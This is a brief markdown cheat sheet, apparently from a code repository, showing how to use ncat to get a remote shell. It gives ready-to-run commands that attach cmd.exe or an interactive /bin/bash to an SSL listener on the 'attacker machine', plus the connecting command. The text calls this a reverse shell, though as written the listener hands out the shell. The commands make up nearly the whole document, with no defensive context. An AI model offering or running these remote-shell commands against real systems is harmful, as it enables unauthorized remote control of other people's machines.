## Setup a Netcat listener on the attacker machine

Win: `ncat -lvp port -e cmd.exe --allow ip --ssl`  <br>
Linux: `ncat -lvp port -e '/bin/bash -i' --allow ip --ssl`

where `port` is any port number, and `ip` is the other machine IP.

## To obtain a reverse shell on the other machine

`ncat -v ip2 port --ssl`

where `port` is any port number, and `ip2` is the other machine IP.

![nc](https://user-images.githubusercontent.com/12968456/28184683-a13c6d5e-6814-11e7-87ea-28c7069a20b7.png)
